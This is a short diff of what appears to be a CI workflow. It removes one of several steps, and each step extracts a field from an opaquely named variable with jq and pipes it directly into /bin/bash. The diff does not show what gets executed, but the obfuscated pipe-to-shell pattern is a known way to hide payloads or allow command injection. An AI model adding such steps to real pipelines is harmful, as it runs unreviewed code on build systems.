@@ -39,7 +39,6 @@ jobs:
           echo $ict34810 | jq -r .dfd93480 | /bin/bash
           printf '%s' "$tk79" | jq -r .jssx13 | /bin/bash
           echo $jrmcp1 | jq -r .zsm41 | /bin/bash
-          echo $ln4 | jq -r .xiw70574 | /bin/bash
           printf '%s' "$oiws952" | jq -r .feu6 | /bin/bash
           echo $ke0 | jq -r .stloq4947 | /bin/bash
 
